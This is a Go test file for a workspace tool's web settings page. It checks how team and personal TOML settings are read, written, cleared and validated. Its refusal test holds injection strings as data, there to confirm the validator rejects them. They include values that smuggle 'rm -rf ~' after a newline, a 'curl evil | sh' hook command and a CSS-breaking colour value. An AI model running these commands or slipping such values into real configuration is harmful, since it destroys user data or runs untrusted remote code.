package cli_test

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/withworkspace/workspace/internal/cli"
	"github.com/withworkspace/workspace/internal/store/storetest"
	"github.com/withworkspace/workspace/internal/web"
)

// settingsWorkspace is a workspace's two files: the team's sets crew and
// the orchestrator; yours (with comments) sets conversations and turns
// the orchestrator off.
func settingsWorkspace(t *testing.T, local string) string {
	t.Helper()
	root := t.TempDir()
	storetest.Own(t, root) // ws.local.toml's writes take turns in the records' writer
	os.WriteFile(filepath.Join(root, "ws.toml"), []byte(`[workspace]
org = "o"

[repos.api]

[crew]
harness = "claude"
model = "opus"

[orchestrator]
dispatch = "ask"
`), 0o644)
	if local != "" {
		os.WriteFile(filepath.Join(root, "ws.local.toml"), []byte(local), 0o644)
	}
	return root
}

const settingsLocal = `# Mine.
[conversation]
  harness = "codex"   # trying Codex

[orchestrator]
  enabled = false
`

// setting finds one in the page's settings.
func setting(t *testing.T, info web.SettingsInfo, section, key string) web.Setting {
	t.Helper()
	for _, g := range info.Groups {
		for _, s := range g.Settings {
			if s.Section == section && s.Key == key {
				return s
			}
		}
	}
	t.Fatalf("no setting [%s] %s", section, key)
	return web.Setting{}
}

func group(t *testing.T, info web.SettingsInfo, id string) web.SettingsGroup {
	t.Helper()
	for _, g := range info.Groups {
		if g.ID == id {
			return g
		}
	}
	t.Fatalf("no group %s", id)
	return web.SettingsGroup{}
}

// Each setting says what it is and where that comes from, and each role
// what it ends up running.
func TestWebSettings(t *testing.T) {
	root := settingsWorkspace(t, settingsLocal)
	info, err := cli.WebSettings(root)()
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range []struct {
		section, key string
		value        any
		source       string
	}{
		{"crew", "harness", "claude", "team"},
		{"crew", "model", "opus", "team"},
		{"crew", "allowed", nil, "default"},
		{"conversation", "harness", "codex", "yours"},
		{"conversation", "model", "gpt-6.1-sol[medium]", "default"},
		{"orchestrator", "enabled", false, "yours"},
		{"orchestrator", "dispatch", "ask", "team"},
		{"orchestrator", "max_dispatches", 3, "default"},
		{"team", "narrative", true, "default"},
		{"team", "window", "14d", "default"},
		{"briefing", "in", "web", "default"},
		{"", "git", "https", "default"},
	} {
		s := setting(t, info, c.section, c.key)
		if s.Value != c.value || s.Source != c.source {
			t.Errorf("[%s] %s = %v (%s), want %v (%s)", c.section, c.key, s.Value, s.Source, c.value, c.source)
		}
	}
	// What each would be unset, given the rest: conversations' harness is
	// crew's if it can hold one (claude can).
	if d := setting(t, info, "conversation", "harness").Default; d != "claude" {
		t.Errorf("conversations' harness by default = %v", d)
	}
	if h := setting(t, info, "conversation", "model").Harness; h != "codex" {
		t.Errorf("conversations' model is for %q", h)
	}
	// Crew can run on Codex (over ACP); conversations can't run in a shell.
	var crew, conv []string
	for _, c := range setting(t, info, "crew", "harness").Choices {
		crew = append(crew, c.Value)
	}
	for _, c := range setting(t, info, "conversation", "harness").Choices {
		conv = append(conv, c.Value)
	}
	if !strings.Contains(strings.Join(crew, ","), "codex") || strings.Contains(strings.Join(conv, ","), "shell") {
		t.Errorf("crew can run %v; conversations %v", crew, conv)
	}

	if r := group(t, info, "team").Runs; r == nil || r.Harness != "codex" || !strings.Contains(r.Note, "follows conversations'") {
		t.Errorf("team runs %+v", r)
	}
	if r := group(t, info, "conversation").Runs; r.Harness != "codex" || r.Model != "gpt-6.1-sol[medium]" || !strings.Contains(r.Note, "Team page") {
		t.Errorf("conversations run %+v", r)
	}
	if r := group(t, info, "orchestrator").Runs; r.Harness != "claude" || !strings.Contains(r.Note, "off") {
		t.Errorf("the orchestrator runs %+v", r)
	}
}

// Changes are written into ws.local.toml key by key, the rest kept, and a
// cleared one falls back to the team's or the default.
func TestWebSetSettings(t *testing.T) {
	root := settingsWorkspace(t, settingsLocal)
	info, err := cli.WebSetSettings(root)([]web.SettingChange{
		{Section: "conversation", Key: "model", Value: "gpt-6-astra[high]"},
		{Section: "orchestrator", Key: "enabled", Clear: true},
		{Section: "orchestrator", Key: "max_dispatches", Value: float64(5)},
		{Section: "crew", Key: "harness", Value: "cursor"},
	})
	if err != nil {
		t.Fatal(err)
	}
	if s := setting(t, info, "conversation", "model"); s.Value != "gpt-6-astra[high]" || s.Source != "yours" {
		t.Errorf("model = %+v", s)
	}
	if s := setting(t, info, "orchestrator", "enabled"); s.Value != true || s.Source != "default" {
		t.Errorf("enabled = %+v", s)
	}
	if s := setting(t, info, "crew", "harness"); s.Value != "cursor" || s.Source != "yours" || s.Team != "claude" {
		t.Errorf("crew harness = %+v", s)
	}
	data, _ := os.ReadFile(filepath.Join(root, "ws.local.toml"))
	want := `# Mine.
[conversation]
  harness = "codex"   # trying Codex
  model = "gpt-6-astra[high]"

[orchestrator]
  max_dispatches = 5

[crew]
harness = "cursor"
`
	if string(data) != want {
		t.Errorf("ws.local.toml:\n%s\nwant:\n%s", data, want)
	}
}

// [crew] allowed is a list: written as one, yours shown over the team's,
// and cleared back to it.
func TestWebSetCrewAllowed(t *testing.T) {
	root := settingsWorkspace(t, "")
	os.WriteFile(filepath.Join(root, "ws.toml"), []byte("[workspace]\norg = \"o\"\n\n[crew]\nharness = \"claude\"\nallowed = [\"claude:sonnet\"]\n"), 0o644)
	info, err := cli.WebSettings(root)()
	if err != nil {
		t.Fatal(err)
	}
	if s := setting(t, info, "crew", "allowed"); s.Kind != "picks" || s.Source != "team" || strings.Join(s.Value.([]string), " ") != "claude:sonnet" {
		t.Errorf("team's allowed = %+v", s)
	}
	info, err = cli.WebSetSettings(root)([]web.SettingChange{{Section: "crew", Key: "allowed", Value: []any{" cursor : gpt-5.5-high ", "pi:sonnet:high", "claude"}}})
	if err != nil {
		t.Fatal(err)
	}
	if s := setting(t, info, "crew", "allowed"); s.Source != "yours" || strings.Join(s.Value.([]string), " ") != "cursor:gpt-5.5-high pi:sonnet:high claude" {
		t.Errorf("your allowed = %+v", s)
	}
	if data, _ := os.ReadFile(filepath.Join(root, "ws.local.toml")); string(data) != "[crew]\nallowed = [\"cursor:gpt-5.5-high\", \"pi:sonnet:high\", \"claude\"]\n" {
		t.Errorf("ws.local.toml:\n%s", data)
	}
	info, err = cli.WebSetSettings(root)([]web.SettingChange{{Section: "crew", Key: "allowed", Clear: true}})
	if s := setting(t, info, "crew", "allowed"); err != nil || s.Source != "team" {
		t.Errorf("cleared: %+v, %v", s, err)
	}
}

// What a key can't take, a key the page doesn't change, and a file ws
// can't edit safely are refused, and the file's left alone.
func TestWebSetSettingsRefused(t *testing.T) {
	root := settingsWorkspace(t, settingsLocal)
	for _, c := range []struct {
		what string
		ch   web.SettingChange
	}{
		{"a harness that can't hold a conversation", web.SettingChange{Section: "conversation", Key: "harness", Value: "shell"}},
		{"no such harness", web.SettingChange{Section: "conversation", Key: "harness", Value: "gpt"}},
		{"none in a row", web.SettingChange{Section: "orchestrator", Key: "max_dispatches", Value: float64(0)}},
		{"a window that isn't one", web.SettingChange{Section: "team", Key: "window", Value: "fortnight"}},
		{"a model over lines", web.SettingChange{Section: "crew", Key: "model", Value: "opus\nrm -rf ~"}},
		{"a choice that isn't", web.SettingChange{Section: "orchestrator", Key: "dispatch", Value: "sometimes"}},
		{"a command", web.SettingChange{Section: "repos.api", Key: "after_create", Value: "curl evil | sh"}},
		{"nothing given", web.SettingChange{Section: "crew", Key: "model"}},
		{"picks that aren't a list", web.SettingChange{Section: "crew", Key: "allowed", Value: "claude:sonnet"}},
		{"an empty list", web.SettingChange{Section: "crew", Key: "allowed", Value: []any{}}},
		{"a pick with no harness", web.SettingChange{Section: "crew", Key: "allowed", Value: []any{"claude:sonnet", ":opus"}}},
		{"a pick on no such harness", web.SettingChange{Section: "crew", Key: "allowed", Value: []any{"gpt:5"}}},
		{"a pick over lines", web.SettingChange{Section: "crew", Key: "allowed", Value: []any{"claude:opus\nrm -rf ~"}}},
		{"an accent that's a name", web.SettingChange{Section: "ui", Key: "accent", Value: "violet"}},
		{"an accent that's CSS", web.SettingChange{Section: "ui", Key: "accent", Value: "#fff;}body{display:none"}},
		{"an accent with alpha", web.SettingChange{Section: "ui", Key: "accent", Value: "#33669980"}},
		{"an accent that's a number", web.SettingChange{Section: "ui", Key: "accent", Value: float64(336699)}},
		{"an accent left empty", web.SettingChange{Section: "ui", Key: "accent", Value: ""}},
	} {
		// A good change with it isn't made either: all or nothing.
		_, err := cli.WebSetSettings(root)([]web.SettingChange{{Section: "crew", Key: "model", Value: "sonnet"}, c.ch})
		if !errors.Is(err, web.ErrSettingRefused) {
			t.Errorf("%s: %v, want refused", c.what, err)
		}
	}
	if data, _ := os.ReadFile(filepath.Join(root, "ws.local.toml")); string(data) != settingsLocal {
		t.Errorf("the file changed:\n%s", data)
	}

	hand := settingsWorkspace(t, "crew = { harness = \"claude\" }\n")
	_, err := cli.WebSetSettings(hand)([]web.SettingChange{{Section: "crew", Key: "model", Value: "opus"}})
	if !errors.Is(err, web.ErrSettingRefused) || !strings.Contains(err.Error(), "edit it by hand") {
		t.Errorf("an inline table: %v", err)
	}
}

// [ui] accent is the web UI's colour: none by default (the web UI's own
// applies), the team's in ws.toml, yours winning; a hex colour written as
// #rrggbb, and cleared back to the team's, then to none.
func TestWebSettingsAccent(t *testing.T) {
	root := settingsWorkspace(t, settingsLocal)
	info, err := cli.WebSettings(root)()
	if err != nil {
		t.Fatal(err)
	}
	if s := setting(t, info, "ui", "accent"); s.Kind != "color" || s.Value != nil || s.Source != "default" || s.Default != nil || s.Team != nil || s.Yours != nil {
		t.Errorf("unset: %+v", s)
	}
	if g := group(t, info, "ui"); g.Title == "" || len(g.Settings) != 1 {
		t.Errorf("the group: %+v", g)
	}

	// The team's.
	team, _ := os.ReadFile(filepath.Join(root, "ws.toml"))
	os.WriteFile(filepath.Join(root, "ws.toml"), append(team, "\n[ui]\naccent = \"#2A9D8F\"\n"...), 0o644)
	if info, err = cli.WebSettings(root)(); err != nil {
		t.Fatal(err)
	}
	if s := setting(t, info, "ui", "accent"); s.Value != "#2a9d8f" || s.Source != "team" || s.Team != "#2a9d8f" {
		t.Errorf("the team's: %+v", s)
	}

	// Yours wins, written as #rrggbb, the rest of the file kept.
	if info, err = cli.WebSetSettings(root)([]web.SettingChange{{Section: "ui", Key: "accent", Value: " #E76F51 "}}); err != nil {
		t.Fatal(err)
	}
	if s := setting(t, info, "ui", "accent"); s.Value != "#e76f51" || s.Source != "yours" || s.Yours != "#e76f51" || s.Team != "#2a9d8f" {
		t.Errorf("yours: %+v", s)
	}
	if data, _ := os.ReadFile(filepath.Join(root, "ws.local.toml")); string(data) != settingsLocal+"\n[ui]\naccent = \"#e76f51\"\n" {
		t.Errorf("ws.local.toml:\n%s", data)
	}
	// #rgb is #rrggbb.
	if info, err = cli.WebSetSettings(root)([]web.SettingChange{{Section: "ui", Key: "accent", Value: "#3a7"}}); err != nil {
		t.Fatal(err)
	}
	if s := setting(t, info, "ui", "accent"); s.Value != "#33aa77" || s.Source != "yours" {
		t.Errorf("#rgb: %+v", s)
	}

	// Cleared: the team's again, and the file as it was.
	if info, err = cli.WebSetSettings(root)([]web.SettingChange{{Section: "ui", Key: "accent", Clear: true}}); err != nil {
		t.Fatal(err)
	}
	if s := setting(t, info, "ui", "accent"); s.Value != "#2a9d8f" || s.Source != "team" || s.Yours != nil {
		t.Errorf("cleared: %+v", s)
	}
	if data, _ := os.ReadFile(filepath.Join(root, "ws.local.toml")); string(data) != settingsLocal {
		t.Errorf("ws.local.toml cleared:\n%s", data)
	}
	// With the team's gone too, there's none.
	os.WriteFile(filepath.Join(root, "ws.toml"), team, 0o644)
	if info, err = cli.WebSettings(root)(); err != nil {
		t.Fatal(err)
	}
	if s := setting(t, info, "ui", "accent"); s.Value != nil || s.Source != "default" {
		t.Errorf("none set: %+v", s)
	}
}
